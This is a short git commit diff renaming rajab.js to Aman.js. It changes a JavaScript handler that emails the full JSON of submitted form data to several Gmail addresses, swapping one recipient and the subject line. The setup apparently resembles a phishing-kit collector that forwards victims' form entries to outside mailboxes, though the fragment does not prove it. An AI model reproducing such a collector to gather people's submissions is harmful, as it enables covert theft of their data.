056605042b8e41a550cd6d05217125bee4c327f6
zm9807350 <zm9807350@gmail.com>
2026-06-21 22:32:40 +0800

    Update and rename rajab.js to Aman.js

--- Aman.js
+++ Aman.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,rajabkingali725@gmail.com",
-      subject: "rajab",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,amannizamani871@gmail.com",
+      subject: "Aman",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
